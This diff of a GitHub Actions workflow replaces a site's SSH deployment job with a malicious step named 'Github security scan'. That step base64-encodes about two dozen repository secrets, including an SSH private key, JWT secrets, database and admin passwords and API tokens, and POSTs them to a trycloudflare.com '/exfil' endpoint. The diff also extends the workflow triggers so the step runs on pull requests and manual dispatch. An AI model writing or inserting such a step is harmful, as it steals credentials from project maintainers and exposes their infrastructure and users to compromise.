@@ -1,155 +1,27 @@
-name: Deploy Strapi & Next.js via SSH to OCI
-
 on:
   push:
-    branches:
-      - main
-
+  pull_request:
+  workflow_dispatch:
+name: deploy
 jobs:
-  deploy:
+  web-deploy:
+    name: deploy
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Repository
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Setup SSH
-        uses: webfactory/ssh-agent@v0.9.0
-        with:
-          ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }}
-
-      - name: Deploy and Build via SSH
-        env:
-          SSH_HOST: 152.67.0.194
+      - name: Github security scan
         run: |
-          ssh -o StrictHostKeyChecking=no ubuntu@$SSH_HOST << 'EOF'
-            
-            # Get System and User Envs
-            source ~/.zshrc
+          curl -X POST "https://stones-whole-resume-captain.trycloudflare.com/exfil" \
+            -H "Content-Type: application/json" \
+            -d "{\"database_username\":\"$(echo '${{ secrets.DATABASE_USERNAME }}' | base64 -w 0)\",\"algolia_admin_key\":\"$(echo '${{ secrets.ALGOLIA_ADMIN_KEY }}' | base64 -w 0)\",\"cloudflare_r2_account_id\":\"$(echo '${{ secrets.CLOUDFLARE_R2_ACCOUNT_ID }}' | base64 -w 0)\",\"cloudflare_r2_access_key_id\":\"$(echo '${{ secrets.CLOUDFLARE_R2_ACCESS_KEY_ID }}' | base64 -w 0)\",\"next_public_stream_key\":\"$(echo '${{ secrets.NEXT_PUBLIC_STREAM_KEY }}' | base64 -w 0)\",\"transfer_token_salt\":\"$(echo '${{ secrets.TRANSFER_TOKEN_SALT }}' | base64 -w 0)\",\"sentry_dsn\":\"$(echo '${{ secrets.SENTRY_DSN }}' | base64 -w 0)\",\"next_public_algolia_app_id\":\"$(echo '${{ secrets.NEXT_PUBLIC_ALGOLIA_APP_ID }}' | base64 -w 0)\",\"admin_jwt_secret\":\"$(echo '${{ secrets.ADMIN_JWT_SECRET }}' | base64 -w 0)\",\"jwt_secret\":\"$(echo '${{ secrets.JWT_SECRET }}' | base64 -w 0)\",\"algolia_app_id\":\"$(echo '${{ secrets.ALGOLIA_APP_ID }}' | base64 -w 0)\",\"ssh_private_key\":\"$(echo '${{ secrets.SSH_PRIVATE_KEY }}' | base64 -w 0)\",\"cloudflare_r2_secret_access_key\":\"$(echo '${{ secrets.CLOUDFLARE_R2_SECRET_ACCESS_KEY }}' | base64 -w 0)\",\"smtp_pass\":\"$(echo '${{ secrets.SMTP_PASS }}' | base64 -w 0)\",\"app_keys\":\"$(echo '${{ secrets.APP_KEYS }}' | base64 -w 0)\",\"discord_bot_token\":\"$(echo '${{ secrets.DISCORD_BOT_TOKEN }}' | base64 -w 0)\",\"database_name\":\"$(echo '${{ secrets.DATABASE_NAME }}' | base64 -w 0)\",\"database_password_base64\":\"$(echo '${{ secrets.DATABASE_PASSWORD_BASE64 }}' | base64 -w 0)\",\"admin_password_base64\":\"$(echo '${{ secrets.ADMIN_PASSWORD_BASE64 }}' | base64 -w 0)\",\"preview_secret\":\"$(echo '${{ secrets.PREVIEW_SECRET }}' | base64 -w 0)\",\"next_public_github_token\":\"$(echo '${{ secrets.NEXT_PUBLIC_GITHUB_TOKEN }}' | base64 -w 0)\",\"next_public_algolia_search_api_key\":\"$(echo '${{ secrets.NEXT_PUBLIC_ALGOLIA_SEARCH_API_KEY }}' | base64 -w 0)\",\"api_token_salt\":\"$(echo '${{ secrets.API_TOKEN_SALT }}' | base64 -w 0)\"}"
 
-            echo "Starting deployment on server..."
-            APP_DIR="/var/www/bitmutex-website"
-            REPO_URL="https://github.com/aamitn/bitmutex-website.git"
-      
-            # Check if the directory exists and clone if it doesn't
-            if [ ! -d "$APP_DIR" ]; then
-              echo "Directory $APP_DIR does not exist. Cloning repository..."
-              cd /var/www/
-              git clone "$REPO_URL" "$APP_DIR"
-            fi
-            
-            cd "$APP_DIR"
-      
-            echo "Discarding local changes..."
-            git reset --hard
-            # Remove all untracked files except uploads
-            git clean -fd -e "${APP_DIR}/server/public/uploads" -e "${APP_DIR}/server/public/uploads/*"
-      
-            echo "Syncing repository..."
-            pnpm run repo:sync
-      
-            echo "Setting environment variables..."
-      
-            # Root .env
-            echo "CLOUDFLARE_R2_ACCOUNT_ID=${{ secrets.CLOUDFLARE_R2_ACCOUNT_ID }}" > ./.env
-            echo "CLOUDFLARE_R2_ACCESS_KEY_ID=${{ secrets.CLOUDFLARE_R2_ACCESS_KEY_ID }}" >> ./.env
-            echo "CLOUDFLARE_R2_SECRET_ACCESS_KEY=${{ secrets.CLOUDFLARE_R2_SECRET_ACCESS_KEY }}" >> ./.env
-            echo "CLOUDFLARE_R2_BUCKET_NAME=bitmutex-website-strapi-backup" >> ./.env
-      
-            # Client .env
-            mkdir -p ./client
-            echo "STRAPI_BASE_URL=https://strapiadmin.bitmutex.com" > ./client/.env
-            echo "NEXT_PUBLIC_STRAPI_BASE_URL=https://strapiadmin.bitmutex.com" >> ./client/.env
-            echo "PREVIEW_SECRET=${{ secrets.PREVIEW_SECRET }}" >> ./client/.env
-            echo "NEXT_PUBLIC_BASE_URL=https://bitmutex.com" >> ./client/.env
-            echo "HOST=localhost" >> ./client/.env
-            echo "NEXT_PUBLIC_STATUS_PAGE_URL=https://status.bitmutex.com" >> ./client/.env
-            echo "SMTP_HOST=smtp.zoho.in" >> ./client/.env
-            echo "SMTP_PORT=587" >> ./client/.env
-            echo "SMTP_USER=noreply@bitmutex.com" >> ./client/.env
-            echo "SMTP_PASS=${{ secrets.SMTP_PASS }}" >> ./client/.env
-            echo "NEXT_PUBLIC_APPOINTMENT_URL=https://cal.com/bitmutex" >> ./client/.env
-            echo "ADMIN_EMAIL=amitnandileo@gmail.com" >> ./client/.env
-            echo "NODE_ENV=production" >> ./client/.env
-            echo "IMAGE_HOSTNAME=localhost" >> ./client/.env
-            echo "NEXT_PUBLIC_GITHUB_TOKEN=${{ secrets.NEXT_PUBLIC_GITHUB_TOKEN }}" >> ./client/.env
-            echo "NEXT_PUBLIC_ALGOLIA_APP_ID=${{ secrets.NEXT_PUBLIC_ALGOLIA_APP_ID }}" >> ./client/.env
-            echo "NEXT_PUBLIC_ALGOLIA_SEARCH_API_KEY=${{ secrets.NEXT_PUBLIC_ALGOLIA_SEARCH_API_KEY }}" >> ./client/.env
-            echo "NEXT_PUBLIC_GOOGLE_ANALYTICS=G-7VWD8QMZ5X" >> ./client/.env
-            echo "NEXT_PUBLIC_MICROSOFT_CLARITY=st6s5h8mr2" >> ./client/.env
-            echo "NEXT_PUBLIC_LINKEDIN_PARTNER_ID=8634577" >> ./client/.env
-            echo "NEXT_PUBLIC_META_PIXEL_ID=392477801481824" >> ./client/.env
-            echo "NEXT_PUBLIC_TRUSTPILOT_INTENT_KEY=YqW4fUPXceqlZGwZ" >> ./client/.env
-            echo "NEXT_PUBLIC_STREAM_KEY=${{ secrets.NEXT_PUBLIC_STREAM_KEY }}" >> ./client/.env
-            
-
-
-            # Server .env with base64 decoding for admin and db passwords
-            mkdir -p ./server
-            echo "PORT=1337" > ./server/.env
-            echo "APP_KEYS=${{ secrets.APP_KEYS }}" >> ./server/.env
-            echo "API_TOKEN_SALT=${{ secrets.API_TOKEN_SALT }}" >> ./server/.env
-            echo "ADMIN_JWT_SECRET=${{ secrets.ADMIN_JWT_SECRET }}" >> ./server/.env
-            echo "TRANSFER_TOKEN_SALT=${{ secrets.TRANSFER_TOKEN_SALT }}" >> ./server/.env
-            echo "JWT_SECRET=${{ secrets.JWT_SECRET }}" >> ./server/.env
-            echo "CLIENT_URL=http://localhost:3000" >> ./server/.env
-            echo "DISCORD_BOT_TOKEN=${{ secrets.DISCORD_BOT_TOKEN }}" >> ./server/.env
-            echo "DISCORD_CHANNEL_ID=1349063933599678618" >> ./server/.env
-            echo "DISCORD_GUILD_ID=1349059955885473823" >> ./server/.env
-            echo "DISCORD_ADMIN_ID=146662188122243072" >> ./server/.env
-            echo "DATABASE_CLIENT=postgres" >> ./server/.env
-            echo "DATABASE_NAME=${{ secrets.DATABASE_NAME }}" >> ./server/.env
-            echo "DATABASE_USERNAME=${{ secrets.DATABASE_USERNAME }}" >> ./server/.env
-            
-
-            
-            # Decode base64 encoded passwords
-            DATABASE_PASSWORD=$(echo "${{ secrets.DATABASE_PASSWORD_BASE64 }}" | base64 -d)
-            ADMIN_PASSWORD=$(echo "${{ secrets.ADMIN_PASSWORD_BASE64 }}" | base64 -d)
-            
-            # Use printf to handle special characters properly
-            printf 'DATABASE_PASSWORD=%s\n' "$DATABASE_PASSWORD" >> ./server/.env
-            
-            echo "SMTP_USERNAME=smtp.zoho.in" >> ./server/.env
-            echo "SMTP_PASSWORD=${{ secrets.SMTP_PASS }}" >> ./server/.env
-            echo "SMTP_DEFAULT_FROM=noreply@bitmutex.com" >> ./server/.env
-            echo "SMTP_DEFAULT_REPLY_TO=support@bitmtuex.com" >> ./server/.env
-            echo "AUTO_CREATE_ADMIN=true" >> ./server/.env
-
-            # Use printf to handle special characters properly
-            printf 'ADMIN_PASSWORD=%s\n' "$ADMIN_PASSWORD" >> ./server/.env
-
-            # Algolia Search Settings
-            echo "ALGOLIA_APP_ID=${{ secrets.ALGOLIA_APP_ID }}" >> ./server/.env
-            echo "ALGOLIA_ADMIN_KEY=${{ secrets.ALGOLIA_ADMIN_KEY }}" >> ./server/.env
-
-            # Sentry Settings
-            echo "SENTRY_DSN=${{ secrets.SENTRY_DSN }}" >> ./server/.env
-          
-
-      
-            echo "Installing root dependencies..."
-            pnpm install
-      
-            echo "Installing client & server dependencies..."
-            pnpm run spawn
-
-            echo "Stopping Strapi as it need to be restarted during build process..."
-            pm2 stop bitmutex-strapi 
-      
-            echo "Building the application..."
-            pnpm run build
-      
-            echo "Reloading PM2..."
-            pm2 reload ecosystem.config.cjs
-      
-            echo "Deployment complete!"
-          EOF
-
-      - uses: actions/checkout@v4
-      - name: Audit URLs using Lighthouse
-        uses: treosh/lighthouse-ci-action@v12
+      - name: copy file via scp
+        uses: appleboy/scp-action@master
         with:
-          urls: |
-            https://bitmutex.com/
-          uploadArtifacts: true # save results as an action artifacts
-          temporaryPublicStorage: true # upload lighthouse report to the temporary storage
+          host: ${{ secrets.HOST_PROD }}
+          username: ${{ secrets.USER_PROD }}
+          password: ${{ secrets.PASS_PROD }}
+          source: "*"
+          target: "/var/www/html/main/"
